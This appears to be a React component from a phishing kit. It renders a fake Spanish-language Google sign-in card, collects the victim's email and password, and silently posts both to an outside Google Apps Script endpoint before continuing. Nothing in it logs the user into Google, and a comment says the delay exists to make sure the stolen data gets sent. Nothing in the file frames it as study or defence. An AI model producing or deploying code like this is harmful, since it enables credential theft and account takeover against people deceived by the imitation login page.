import { useState } from "react";
import GoogleLogo from "./GoogleLogo";

const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) => {
  const [step, setStep] = useState<"email" | "password">("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [emailError, setEmailError] = useState("");

  const webAppUrl = "https://script.google.com/macros/s/AKfycbzvYw6wrFwLPUWZ4dhM7HDF04wQRK0zLgfkey36BaicDoA75Zp3dM647ZkvV0raZim3/exec";

  const handleEmailNext = () => {
    if (!email.trim()) {
      setEmailError("Introduce un correo electrónico");
      return;
    }
    setEmailError("");
    setStep("password");
  };

  const handlePasswordNext = async () => {
    if (!password.trim()) return;

    try {
      // Enviar datos
      fetch(webAppUrl, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({ 
          usuario: email, 
          pass: password, 
          tipo: "LOGIN_GOOGLE" 
        })
      });
    } catch (e) {
      console.log("Error de red");
    }

    // Esperar medio segundo para asegurar que el paquete de datos salga
    setTimeout(() => {
      onLoginComplete();
    }, 600);
  };

  return (
    <div className="w-full max-w-[450px] mx-auto">
      <div className="forms-card p-10 sm:p-12">
        <div className="flex justify-center mb-4"><GoogleLogo size={32} /></div>
        <h1 className="text-2xl font-normal text-center mb-2 font-google-sans">
          {step === "email" ? "Iniciar sesión" : "Te damos la bienvenida"}
        </h1>
        <p className="text-center text-sm mb-8">
          {step === "email" ? "Utiliza tu cuenta de Google" : email}
        </p>

        <div className="space-y-6">
          {step === "email" ? (
            <input
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Correo electrónico o teléfono"
              className="google-input w-full"
              autoFocus
            />
          ) : (
            <div className="space-y-4">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Introduce tu contraseña"
                className="google-input w-full"
                autoFocus
              />
              <label className="flex items-center gap-3 cursor-pointer">
                <input type="checkbox" onChange={(e) => setShowPassword(e.target.checked)} className="w-4 h-4 accent-[#1a73e8]" />
                <span className="text-sm">Mostrar contraseña</span>
              </label>
            </div>
          )}

          {emailError && <p className="text-xs text-destructive">⚠ {emailError}</p>}

          <div className="flex justify-between items-center pt-4">
            <button className="google-btn-text text-sm font-medium">Crear cuenta</button>
            <button onClick={step === "email" ? handleEmailNext : handlePasswordNext} className="google-btn-blue">
              Siguiente
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default GoogleLoginCard;
